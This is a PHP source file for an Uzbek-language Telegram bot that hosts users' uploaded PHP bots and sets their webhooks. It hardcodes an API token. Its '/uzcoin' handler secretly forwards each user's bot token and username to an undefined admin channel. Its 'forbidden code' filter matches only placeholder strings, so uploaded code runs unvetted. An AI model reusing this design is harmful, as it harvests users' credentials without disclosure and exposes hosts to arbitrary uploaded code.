<?php
ob_start();
define('API_KEY','5038679102:AAFB1IO3P3I4i0wC2epMPO36ndtA252A92A');
$admin = "1919193948";
function up($ch){
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'upload_photo',
]);
}
function ty($ch){
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$tx = $message->text;
$photo_id=$message->photo[1]->file_id;
$joy = file_get_contents("$cid/$cid.joy");
$step = file_get_contents("$cid/$cid.step");
$username = $message->from->username;
$soat = date('H:i:s', strtotime('3 hour'));
$button = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🤖Yordam⁉️"],['text'=>"♻️Bot ulash♻️"],['text'=>"🤖Bot haqida👾"],],
[['text'=>"👨‍💻Developer👨‍🔬"],['text'=>"📊Statistika📈"],['text'=>"Keyingi️"],],
]
]);
$bat2 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🤖Uzcoin️"],['text'=>"👾Rucoin️"],['text'=>"♻️Uzchangebot"],],
[['text'=>"↩️Orqaga qaytish"],],
]
]);
$admo= json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 Orqaga qaytish"],],
]
]);
if($tx == "♻️Bot ulash♻️"){
ty($cid);
mkdir("$cid");
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"*Botingiz faylini jonating misol php_faylingiz_nomi.php bolsin*!!!",
'parse_mode'=>'markdown',
]);
file_put_contents("$cid/$cid.step", "code");
$baza = file_get_contents("idlar.dat");
if(mb_stripos($baza, $cid) !== false){
}else{
file_put_contents("idlar.dat", "$baza\n$cid");
}
}
$doc=$message->document;
$doc_id=$doc->file_id;
if(isset($message->document) and $step == "code"){
ty($cid);
$url = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getFile?file_id='.$doc_id),true);
$path=$url['result']['file_path'];
$file = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$path;
$type = strtolower(strrchr($file,'.'));
$type=str_replace('.','',$type);
$okey = file_put_contents("$cid/$cid.$type",file_get_contents($file));
$a=file_get_contents("$cid/$cid.$type");
if((mb_strpos($a,"sdsdadwadw")!==false) or (mb_strpos($a,"dsaw")!==false) or (mb_strpos($a,"adsw")!==false)){
  unlink("$cid/$cid..$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    }
    if((mb_strpos($a,"sdsds")!==false) or (mb_strpos($a,"asdss")!==false) or (mb_strpos($a,"dsdsds")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    }
    if((mb_strpos($a,"sdsdsdsa")!==false) or (mb_strpos($a,"adsds")!==false) or (mb_strpos($a,"adsds")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    }
    if((mb_strpos($a,"sdsdsd")!==false) or (mb_strpos($a,"sdsdsd")!==false) or (mb_strpos($a,"sdsdsd")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    } if((mb_strpos($a,"sdsdsdasds")!==false) or (mb_strpos($a,"dssdsda")!==false) or (mb_strpos($a,"sdsdsdw")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    } if((mb_strpos($a,"dsdsd")!==false) or (mb_strpos($a,"sdsdsas")!==false) or (mb_strpos($a,"sdsds")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    } if((mb_strpos($a,"sdsds")!==false) or (mb_strpos($a,"dfd")!==false) or (mb_strpos($a,"fsdfd")!==false)){
  unlink("$cid/$cid.$type");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Faylingda taqiqlangan kod bor*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
    }
if($okey){
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>"*Fayl yuklab olindi endi botni tokenini kiriting namuna\n /token\nbotni_tokeni*  ",
'parse_mode'=>markdown,
]);
}
}
if(isset($message->photo) and $joy){
$url = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getFile?file_id='.$photo_id),true);
$path=$url['result']['file_path'];
$file = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$path;
$okey = file_put_contents("$cid/$cid.pic.png",file_get_contents($file));
$type = strtolower(strrchr($file,'.'));
$type=str_replace('.','',$type);
}
if((mb_stripos($tx,"/token")!==false)){
    $pieces = explode("\n",$tx);
    $s=$pieces[1];
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Botingiz ulandi Tekshiring!!!Agarda ishlamasa kodingizda hato bor yaxshilab tekshirib qaytadan yuboring*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
     file_get_contents("https://api.telegram.org/bot$s/setwebhook?url=https://hosting.vbyte.site/$cid/$cid.php");
}
if($tx == "/start"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Assalomu aleykum botimizga hush kelibsiz agar botimizga birinchi bor tashrif buyurgan bolsangiz 🤖Yordam⁉️ menyusidan bilib olishingiz mumkin  botimiz hozirda  v1.3  versiyada*!!",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);

}
if($tx == "📊Statistika📈"){
$baza = file_get_contents("pechat.dat");
$obsh = substr_count($baza,"\n");
$gruppa = substr_count($baza,"-");
$lichka = $obsh - $gruppa;
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Bot foydalanuvchilari: $obsh ta*\n\n".date("Y-m-d H:i:s", strtotime('3 hour'))."",
     'parse_mode'=>'markdown',
     ]);
}if($tx == "🤖Bot haqida👾"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Bu botni chiqarishdan maqsad yangi boshlovchilar uchun qulaylik tugdirish maqsadda yaratilgan!!!*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
}
if($tx == "↩️Orqaga qaytish"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Orqaga qaytingiz!!*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
}
if($tx == "🤖Yordam⁉️"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Botdan foydalanish uchun siz ♻️Bot ulash♻️ menyusi bosasiz va php faylingizni tashlaysiz keyin esa  botni tokeningizni kiritasiz botni tokeni kiritish uslubi  /token deb paska tushing ESLATMA siz faqat 1ta botni ulay olasiz  bir marta fayl yuklab qaytib yuklamas ekan man deb oylamang faqat 1ta botni token qoshib ishlata olas /token kiritishga namuna\n /token\nbottoken \nagar /token dan keyin joytashlansa bot qabul qilmaydi natijada botingiz ishlamaydi!!!*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
}if($tx == "👨‍💻Developer👨‍🔬"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Bot Yaratuvchisi: User\n\nProfil: @VipBuilder_UzBot 😛\n\nYaratilgan sana: 14:04:2022 21:37*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $button,
     ]);
}if($tx == "Keyingi️"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Assalomu aleykum hurmatli foydalanuchi sizga qulaylik tugdirish maqsadida botni shu yerdan avto ulashni yaratdik yani @Uzbek_developer endi esa shu botlardan biri tanlang agar siz hohlagandek bot yoq bolsa darhol adminga murojat qiling!!! hozirda bu menyular ishlamayapti ishlasa habar beramiz*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $bat2,
     ]);
}
if($tx == "🤖Uzcoin️"){
     bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Yaxshi endi esa tokeningizni kiriting namuna\n/uzcoin\nbotni tokeni shu yerda bolsin\nagar uncha tushunmagan bolsangiz tokendan keyin 1ta joy tashlab keyin yuborish kerak!!*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $bat2,
     ]);
}
if((mb_stripos($tx,"/uzcoin")!==false)){
    $pieces = explode("\n",$tx);
    $s=$pieces[1];
    file_put_contents("$cid/$cid.ph.php","");
   bot('sendMessage',[
     'chat_id'=>$cid,
     'text'=>"*Botingiz ulandi Tekshiring!!!Agarda ishlamasa kodingizda hato bor yaxshilab tekshirib qaytadan yuboring*",
     'parse_mode'=>'markdown',
     'reply_markup'=> $bat2,
     ]);
     file_get_contents("https://api.telegram.org/bot$s/setwebhook?url=https://hosting.vbyte.site/$cid/$cid.php");
     bot('sendMessage',[
     'chat_id'=>$kanal,
     'text'=>"*id: $cid\nUsername: @$username\n Soati: $soat \n Token: $s",
     'parse_mode'=>'markdown',

     ]);
}
$text = "Yuboriladigon xabarni kiriting";
    if($tx == "/send" and $cid == $admin){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$text,
      'reply_markup'=>$admo,
      ]);
      file_put_contents("$cid/$cid.step","send");
    }
    if($step == "send" and $cid == $admin){
      if($tx == "🔙 Orqaga qaytish"){
      unlink("$cid/$cid.step");
        bot('sendMessage',[
      'chat_id'=>$admin,
      'text'=>"Siz orqaga qaytingiz va text ketmadi!!",
      'reply_markup'=>$button,]);
      }else{
      $idss=file_get_contents("idlar.dat");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      ]);
      }
      del("$cid/$cid.step");
      }
    }
?>